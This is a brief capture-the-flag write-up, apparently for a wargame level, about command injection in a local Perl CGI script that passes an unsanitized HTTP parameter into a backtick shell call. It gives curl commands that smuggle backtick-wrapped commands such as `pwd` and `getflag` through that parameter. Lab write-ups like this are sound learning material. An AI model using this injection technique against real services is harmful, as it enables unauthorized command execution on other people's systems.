# Level 04

Command injection through a local CGI script.

Key line is basically:

```perl
print `echo $y 2>&1`;
```

And y comes from HTTP parameter x. No sanitization.

Check service:

```bash
curl 'http://localhost:4747'
```

Test injection:

```bash
curl 'http://localhost:4747?x=`pwd`'
```

Then execute getflag directly:

```bash
curl 'http://localhost:4747?x=`getflag`'
```

Use single quotes around URL so your local shell does not eat the backticks.

user input into shell vunlnerability.
